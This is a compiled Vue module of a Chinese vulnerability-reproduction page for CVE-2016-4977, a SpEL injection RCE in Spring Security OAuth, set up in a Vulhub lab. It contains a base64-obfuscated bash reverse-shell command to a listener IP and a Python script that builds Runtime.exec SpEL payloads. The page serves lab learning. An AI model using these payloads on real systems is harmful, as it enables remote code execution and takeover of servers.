import{_ as r}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o,c,a as e,b as a,d as i,e as t}from"./app-58e4a7d6.js";const l={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),a(" 漏洞描述")],-1),p=e("p",null,"Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了 Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。",-1),u=e("p",null,"参考链接：",-1),h={href:"http://secalert.net/#CVE-2016-4977",target:"_blank",rel:"noopener noreferrer"},g={href:"https://deadpool.sh/2017/RCE-Springs/",target:"_blank",rel:"noopener noreferrer"},b={href:"http://blog.knownsec.com/2016/10/spring-security-oauth-rce/",target:"_blank",rel:"noopener noreferrer"},m=t('<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动漏洞环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动完成后，访问 <code>http://your-ip:8080/</code> 即可看到 web 页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>访问 <code>http://your-ip:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</code>。首先需要填写用户名和密码，我们这里填入 <code>admin:admin</code> 即可。</p><p>可见，我们输入是 SpEL 表达式 <code>${233*233}</code> 已经成功执行并返回结果：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011404402.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>java 反弹 shell 的命令如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMTc0LjEyOC85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>',10),v={href:"https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py",target:"_blank",rel:"noopener noreferrer"},_=t(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>#!/usr/bin/env python

message = input(&#39;Enter message to encode:&#39;)

poc = &#39;\${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#39; % ord(message[0])

for ch in message[1:]:
   poc += &#39;.concat(T(java.lang.Character).toString(%s))&#39; % ord(ch) 

poc += &#39;)}&#39;

print(poc)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011413565.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>如上图，生成了一大串 SpEL 语句。附带上这个 SpEL 语句发送请求：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011415696.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>监听 999 端口，成功接收反弹 shell（<code>/bin/bash</code> 反弹成功，<code>bash</code> 反弹失败）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011412018.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,6);function f(x,k){const n=s("ExternalLinkIcon");return o(),c("div",null,[d,p,u,e("ul",null,[e("li",null,[e("a",h,[a("http://secalert.net/#CVE-2016-4977"),i(n)])]),e("li",null,[e("a",g,[a("https://deadpool.sh/2017/RCE-Springs/"),i(n)])]),e("li",null,[e("a",b,[a("http://blog.knownsec.com/2016/10/spring-security-oauth-rce/"),i(n)])])]),m,e("p",null,[a("然后，我们使用 "),e("a",v,[a("poc.py"),i(n)]),a(" 来生成反弹 shell 的 POC：")]),_])}const y=r(l,[["render",f],["__file","Spring Security OAuth2 远程命令执行漏洞 CVE-2016-4977.html.vue"]]);export{y as default};
